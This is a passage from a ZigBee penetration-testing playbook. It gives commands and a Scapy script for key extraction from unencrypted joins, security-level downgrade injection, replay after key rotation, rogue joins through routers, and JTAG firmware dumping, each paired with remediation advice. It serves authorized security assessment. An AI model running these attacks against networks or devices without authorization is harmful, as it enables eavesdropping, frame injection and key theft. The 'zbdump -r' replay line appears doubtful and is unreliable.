**Vulnerability Reference:** Trust center sends default link key unencrypted to devices without pre-configured keys

### Steps

```bash
# Step 1 — Begin passive capture (TC-01)
zbdump -i /dev/ttyUSB0 -c 15 -w first_join.pcap &

# Step 2 — Factory reset a device that has NO pre-configured key
# (Or use a new out-of-box device to join the network for the first time)

# Step 3 — In Wireshark, filter for APS Update Device and Transport Key
# zbee_aps.cmd.id == 0x05

# Step 4 — Check the APS layer security field
# If: APS Security = False AND cmd.id == Transport Key → CRITICAL
# The key is being sent without APS encryption

# Step 5 — Extract key from unencrypted Transport Key frame
# Wireshark: ZigBee APS > Command Payload > Key
# Copy the 16-byte hex value directly

echo "[*] Extracted network key from unencrypted transport:"
echo "Key: <16-byte hex from Wireshark>"

# Step 6 — Verify key by using it to decrypt subsequent network traffic
# Wireshark Preferences > ZigBee > Add extracted key
```

### Remediation

- Pre-configure link keys on all devices before deployment (out-of-band)
- Never allow devices to join without a pre-installed, unique link key
- If open joining is required, restrict to a physically controlled commissioning window

---

## TC-17 — Security Level Downgrade

**Type:** Protocol Manipulation  
**CVSS v3.1 Base Score:** 7.4 (High)  
**Vulnerability Reference:** Security level field in Auxiliary Security Header is not independently authenticated

### Objective

Attempt to inject or replay frames with security level set to 0x00 (None) or 0x04 (Encryption only, no MIC) to bypass frame integrity checks.

### Steps

```bash
cat > sec_level_downgrade.py << 'EOF'
from scapy.all import *
from scapy.layers.dot15d4 import *
import struct

TARGET = 0x1234
PAN_ID = 0x1A2B

# Craft frame with security bit set but security level = 0x00 (None)
# This tests whether the receiver accepts frames with degraded security levels

def craft_downgraded_frame(sec_level):
    nwk_payload = bytes([
        0x08, 0x00,       # Frame control: security bit set
        TARGET & 0xFF, (TARGET >> 8) & 0xFF,
        0x01, 0x00,       # Source
        0x01,             # Radius
        0xBB,             # Sequence number
        sec_level,        # Security control: ONLY security level field, no key ID, no nonce
        0x01, 0x00, 0x00, 0x00,  # Frame counter
        # No MIC (M=0)
        0x48, 0x65, 0x6C, 0x6C, 0x6F  # Plaintext "Hello"
    ])
    return (Dot15d4(fcf_frametype=1) /
            Dot15d4Data(dest_panid=PAN_ID, dest_addr=TARGET, src_addr=0x0001) /
            Raw(load=nwk_payload))

for level in [0x00, 0x01, 0x04]:
    print(f"[*] Sending frame with security level: 0x{level:02X}")
    sendp(craft_downgraded_frame(level), iface="wpan0", verbose=False)

print("[*] Monitor target for processing downgraded frames")
EOF

python3 sec_level_downgrade.py
```

### Remediation

- Enforce minimum required security level in coordinator policy
- Reject frames with security level below the configured minimum
- Implement policy enforcement at both NWK and APS layers

---

## TC-18 — Frame Counter Reset / Rollback

**Type:** Protocol Manipulation  
**CVSS v3.1 Base Score:** 6.5 (Medium)  
**Vulnerability Reference:** Network key rotation resets frame counters; attacker can replay old frames after key update

### Steps

```bash
# Step 1 — Capture traffic BEFORE network key rotation event
zbdump -i /dev/ttyUSB0 -c 15 -w pre_rotation.pcap

# Step 2 — Trigger network key rotation (if you have coordinator access)
# OR: Wait for scheduled key rotation (24-hour cycle in many implementations)

# Step 3 — Capture traffic AFTER key rotation
zbdump -i /dev/ttyUSB0 -c 15 -w post_rotation.pcap &

# Step 4 — Replay frames from pre-rotation capture using zbreplay
zbdump -i /dev/ttyUSB0 -c 15 -w pre_rotation.pcap -r  # -r = replay mode
# OR using KillerBee:
zbreplay -i /dev/ttyUSB0 -c 15 -f pre_rotation.pcap

# Step 5 — Observe if target processes replayed frames
# After key rotation, frame counters reset to 0, making old frames "fresh" again
```

### Remediation

- Maintain per-device persistent frame counter logs across key rotations
- Use sequence number validation independent of key rotation
- Implement timestamp-based replay protection at application layer

---

## TC-19 — Distributed Security Mode Weakness

**Type:** Authentication Bypass  
**CVSS v3.1 Base Score:** 8.8 (High)  
**Vulnerability Reference:** All nodes share same network key; router-level compromise compromises entire network

### Steps

```bash
# Step 1 — Confirm distributed security mode (no Trust Center APS commands in capture)
# In Wireshark: No zbee_aps.cmd.id == 0x02 (Update Device) from a designated Trust Center

# Step 2 — Identify the router acting as local authenticator
# Filter: zbee_nwk.cmd.id == 0x07 (Rejoin Response) — router sending this is the auth router

# Step 3 — Attempt to join via any router (not just coordinator)
(zigdiggity) scan --channel 15
(zigdiggity) join --pan_id 0x1A2B --router 0xAAAA  # Target router, not coordinator

# Step 4 — Once joined, confirm network key is the same across all routers
# (It must be by design — distributed mode has one shared key)
# Capture traffic from multiple router-to-router paths and verify decryption with single key

# Step 5 — Demonstrate blast radius: compromise one router → decrypt entire network
```

### Remediation

- Migrate to centralized security mode with dedicated Trust Center
- If distributed mode is required, implement additional application-layer encryption
- Limit network size to reduce blast radius of key compromise

---

## TC-20 — Physical Tamper / JTAG/UART Debug Port Extraction

**Type:** Physical / Hardware  
**CVSS v3.1 Base Score:** 6.8 (Medium) — `AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**Vulnerability Reference:** Debug interfaces left enabled on production devices; allows key and firmware extraction

### Steps

```bash
# Step 1 — Physical inspection of PCB
# Use magnifying glass / microscope to locate:
# - JTAG/SWD header (4-10 pin, often unlabeled)
# - UART header (TX/RX/GND pads, often 3-pin)
# - Test points near microcontroller (TCK, TMS, TDI, TDO, TRST)

# Step 2 — Identify microcontroller (MCU)
# Common ZigBee MCUs: CC2530, CC2652, EFR32MG, nRF52840, JN5169
# Search MCU part number for JTAG pinout

# Step 3 — Connect Bus Pirate or JLink to debug port
# Example: STM32 with SWD
openocd -f interface/jlink.cfg -f target/stm32f1x.cfg -c "init; halt"

# Step 4 — Check for debug lock
# If not locked:
openocd -c "dump_image full_flash.bin 0x08000000 0x80000"
echo "[CRITICAL] Debug port accessible — full firmware extracted"

# Step 5 — Scan UART for debug output
# Connect USB-UART adapter (TX→RX, RX→TX, GND→GND)
# Try common baud rates: 115200, 57600, 38400, 9600
minicom -D /dev/ttyUSB0 -b 115200
# Power cycle device and observe boot log for key material or credentials

# Step 6 — Search extracted firmware for keys (cross-reference with TC-04)
strings full_flash.bin | grep -iE "zigbee|alliance|key|nwk"
```

### Remediation

- Disable JTAG/SWD in production firmware (set RDP Level 2 or equivalent)
- Remove or cover debug headers on production PCBs
- Implement secure boot with firmware signing
- Disable UART debug output in production builds

---

## CVSS Scoring Reference

| Test Case | Base Score | Vector |
|---|---|---|
| TC-01 Passive Sniff | 5.3 Medium | AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N |
| TC-02 Default Key | 9.8 Critical | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| TC-03 OTA Key Capture | 8.1 High | AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N |
| TC-04 Firmware RE | 7.5 High | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N |
| TC-06 Radio Jamming | 7.5 High | AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| TC-12 Replay Attack | 7.4 High | AV:A/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H |
| TC-13 Rogue Join | 8.8 High | AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| TC-15 TC Impersonation | 9.0 Critical | AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N |
| TC-20 Physical JTAG | 6.8 Medium | AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

---

## Reporting Template

```markdown
## Finding: [Finding Title]

**Test Case ID:** TC-XX  
**Severity:** Critical / High / Medium / Low  
**CVSS Score:** X.X  
**Status:** Open / Closed  

### Description
[Clear description of the vulnerability]

### Evidence
- Packet capture: [filename.pcap]
- Screenshot: [filename.png]
- Extracted data: [details]

### Steps to Reproduce
1. [Step 1]
2. [Step 2]

### Impact
[Business and technical impact]

### Recommendation
[Specific, actionable remediation steps]

### References
- ZigBee Specification 05-3474-21, Section X.X
- CVE-XXXX-XXXXX (if applicable)
- OWASP IoT Attack Surface Areas
```

---

## References

| Source | URL / Citation |
|---|---|
| ZigBee Specification 05-3474-21 | zigbeealliance.org |
| IEEE 802.15.4-2020 Standard | ieeexplore.ieee.org |
| KillerBee Framework | github.com/riverloopsec/killerbee |
| ZigDiggity | github.com/BastilleResearch/zigdiggity |
| OWASP IoT Attack Surface | owasp.org/www-project-internet-of-things |
| Bastille Networks ZigBee Research | [Bastille Networks Blog] |
| NIST SP 800-187 (LTE Security) | csrc.nist.gov (cellular comparison reference) |
| GNU Radio | gnuradio.org |
| Scapy Documentation | scapy.readthedocs.io |
| OpenOCD | openocd.org |

---

*Document Version: 1.0 | Classification: Confidential — Authorized Use Only*  
*Based on: IoT Security — Part 6 (ZigBee Security 101) by Dattatray, Payatu, June 2020*
